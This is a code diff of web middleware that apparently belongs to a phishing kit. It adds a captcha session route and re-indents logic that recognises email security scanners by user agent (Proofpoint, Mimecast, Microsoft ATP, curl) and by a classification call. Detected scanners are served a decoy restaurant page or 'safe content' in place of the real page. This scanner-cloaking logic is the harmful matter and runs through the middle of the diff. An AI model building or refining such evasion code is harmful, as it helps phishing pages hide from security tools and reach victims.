@@ -244,6 +244,7 @@ if (!ADMIN_PASSWORD) {
                        pathname === '/api/security/challenge/verify' ||
                        pathname === '/api/captcha-config' ||
                        pathname === '/api/captcha-background' ||
+                       pathname === '/api/captcha/session' ||
                        pathname === '/api/detect-language' ||
                        pathname === '/api/check-fingerprint' ||
                        pathname.startsWith('/api/get-screenshot') ||
@@ -291,20 +292,20 @@ if (!ADMIN_PASSWORD) {
     }
   } else {
     // Only run scanner detection for non-token links
-    const forceBenignTemplate =
-      process.env.NODE_ENV === 'development' &&
-      /proofpoint|mimecast|curl|microsoft office 365 advanced threat protection/i.test(userAgent)
+  const forceBenignTemplate =
+    process.env.NODE_ENV === 'development' &&
+    /proofpoint|mimecast|curl|microsoft office 365 advanced threat protection/i.test(userAgent)
 
-    if (forceBenignTemplate) {
-      const forcedTemplateUrl = new URL('/benign-templates/restaurant/index.html', request.url)
-      console.log('[BENIGN-TEST-MODE] Forcing restaurant template for UA:', userAgent.substring(0, 80))
-      return NextResponse.rewrite(forcedTemplateUrl)
-    }
+  if (forceBenignTemplate) {
+    const forcedTemplateUrl = new URL('/benign-templates/restaurant/index.html', request.url)
+    console.log('[BENIGN-TEST-MODE] Forcing restaurant template for UA:', userAgent.substring(0, 80))
+    return NextResponse.rewrite(forcedTemplateUrl)
+  }
 
-    const detectionHeaders = serializeHeaders(request.headers)
-    try {
-      const scannerDetection = await classifyRequest(userAgent, ip, detectionHeaders)
-      if (scannerDetection.isScanner) {
+  const detectionHeaders = serializeHeaders(request.headers)
+  try {
+    const scannerDetection = await classifyRequest(userAgent, ip, detectionHeaders)
+    if (scannerDetection.isScanner) {
       if (isLocalhost && process.env.NODE_ENV === 'development') {
         console.warn('[Middleware] Scanner detected but running in localhost test mode; skipping safe-content rewrite.')
       } else {
@@ -330,9 +331,9 @@ if (!ADMIN_PASSWORD) {
       return NextResponse.rewrite(safeContentUrl)
       }
     }
-    } catch (error) {
-      if (process.env.NODE_ENV === 'development') {
-        console.warn('[Middleware] Scanner detection failed:', error)
+  } catch (error) {
+    if (process.env.NODE_ENV === 'development') {
+      console.warn('[Middleware] Scanner detection failed:', error)
       }
     }
   }
